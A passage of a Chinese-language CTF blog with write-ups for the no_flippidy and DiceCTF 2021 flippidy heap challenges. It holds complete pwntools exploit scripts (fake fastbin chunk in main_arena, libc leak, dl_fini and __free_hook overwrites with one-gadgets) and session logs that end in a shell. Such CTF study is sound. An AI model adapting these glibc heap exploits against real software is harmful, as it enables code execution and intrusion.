0x0000000000000000   &lt;=== 这里是0x40,0x50的fastbin头位置</span><br><span class="line">0x7f49a29d9c70 &lt;main_arena+48&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>这里尝试在main arena中0x40的位置伪造一个堆块，这样下次取出0x40堆块时，就可以实现一次任意地址写。这样，我们就可以和flippidy一样，写menu，然后打印出一个libc地址！</p><p>接下来，就是写malloc_hook或者dl_fini都可以了。这里练习用dl_fini</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./no_flippidy&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./no_flippidy&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flip</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_add</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b *0x4012D0&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_menu</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b *0x401729&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;will be:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x300200020</span>/<span class="number">8</span>)) <span class="comment"># get a mmaped chunk before libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake chunk in main_arena</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + p64(<span class="number">0x404000</span>) +p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># above menu ptrs, 0x404010 is also ok</span></span><br><span class="line">add(<span class="number">0x5ecc50</span>/<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rewrite blocks, get libc_addr</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line"><span class="comment"># for practise, write dl_fini&#x27;s exit hook</span></span><br><span class="line"><span class="comment"># debug_menu()</span></span><br><span class="line">my_og = libc_addr + og[<span class="number">1</span>]</span><br><span class="line">success(<span class="string">&quot;og: &quot;</span> + <span class="built_in">hex</span>(my_og))</span><br><span class="line">payload2 = <span class="string">b&quot;A&quot;</span>*<span class="number">8</span></span><br><span class="line">payload2 += p64(my_og)</span><br><span class="line">add((<span class="number">0x81c000</span> + <span class="number">0x1208</span>) / <span class="number">8</span>,payload2) <span class="comment"># question: how to find this addr?</span></span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">solve.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  io.sendline(str(3))</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    b&#x27;3\n&#x27;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x9 bytes:</span><br><span class="line">    b&#x27;Goodbye!\n&#x27;</span><br><span class="line">Goodbye!</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b&#x27;ls\n&#x27;</span><br><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    b&#x27;libc.so.6  no_flippidy\tsolve.py\n&#x27;</span><br><span class="line">libc.so.6  no_flippidy    solve.py</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> </span></span><br></pre></td></tr></table></figure><h2 id="遇到的一个特殊点"><a href="#遇到的一个特殊点" class="headerlink" title="遇到的一个特殊点"></a>遇到的一个特殊点</h2><p>这里一开始没注意到一个小问题: 我们伪造的是fastbin chunk，但是他<strong>会检查size</strong>，我们没有伪造size，为什么能过？这是因为有<strong>tcache stashing unlink</strong>机制：在tcache为空的时候，如果这个tcache的槽大小对应的fastbin中有多余的块，会把fastbin中的块全部拿到tcache中（直到填满）因此很巧妙的避开了检查。</p><h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><p>该怎么寻找dl_fini地址呢？</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了新的glibc利用：当可控chunk大小时，分配如上较大快，可以直接相当于劫持glibc和dl。其中dl还可以采用上面的劫持dl_fini的方法一键getshell。注意这里因为分配的时每一个堆块的储存地址的地方，所以还不能直接写exithook和mallochook等，要找到储存exithook和mallochook的地址才行。因此这里采用的是劫持dl_fini中的l-&gt;l_info[DT_FINI]。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dicectf2021_flippidy</title>
      <link href="/2022/01/21/dicectf2021-flippidy/"/>
      <url>/2022/01/21/dicectf2021-flippidy/</url>
      
        <content type="html"><![CDATA[<p>一道简单的double free</p><span id="more"></span><h1 id="dicectf2021-flippidy"><a href="#dicectf2021-flippidy" class="headerlink" title="dicectf2021_flippidy"></a>dicectf2021_flippidy</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在flip时，如果书本页数是奇数数(例如7页)，会依次调转0,6;1,5;2,4;3,3在调转3，3的时候就会造成double free。如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= dword_404150 / <span class="number">2</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)qword_404158 + i) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(s, *((<span class="type">const</span> <span class="type">char</span> **)qword_404158 + i));</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)qword_404158 + i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)qword_404158 + dword_404150 - i - <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, *((<span class="type">const</span> <span class="type">char</span> **)qword_404158 + dword_404150 - i - <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)qword_404158 + dword_404150 - i - <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里比较麻烦的一点就是double free之后还会对内存内容进行一些copy，会让堆结构变得很混乱。我也是经过调试最后解出来的。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./flippidy&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./flippidy&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flip</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_add</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b *0x4012D0&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_menu</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b *0x401729&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;will be:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>)) <span class="comment"># size is 1, cause double free</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0x404020</span>))</span><br><span class="line">flip()<span class="comment"># double free</span></span><br><span class="line">add(<span class="number">0</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])*<span class="number">4</span>+p64(<span class="number">0x404158</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0x0</span>))</span><br><span class="line">add(<span class="number">0</span>,p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base))</span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">0</span>,p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base))</span><br><span class="line">og = [<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>,<span class="number">0x4f2c5</span>]</span><br><span class="line">add(<span class="number">0</span>,p64(og[<span class="number">0</span>]+libc_base))</span><br><span class="line">flip()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="success"><a href="#success" class="headerlink" title="success"></a>success</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    00000000  0a 0a c0 89  eb 38 6a 7f  0a c0 89 eb  38 6a 7f 0a  │····│·8j·│····│8j··│</span><br><span class="line">    00000010  c0 89 eb 38  6a 7f 0a c0  89 eb 38 6a  7f 0a 3a 20  │···8│j···│··8j│··: │</span><br><span class="line">    00000020</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    b&#x27;2\n&#x27;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta prompt_"> $ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b&#x27;ls\n&#x27;</span><br><span class="line">[DEBUG] Received 0x1e bytes:</span><br><span class="line">    b&#x27;flippidy  libc.so.6  solve.py\n&#x27;</span><br><span class="line">flippidy  libc.so.6  solve.py</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
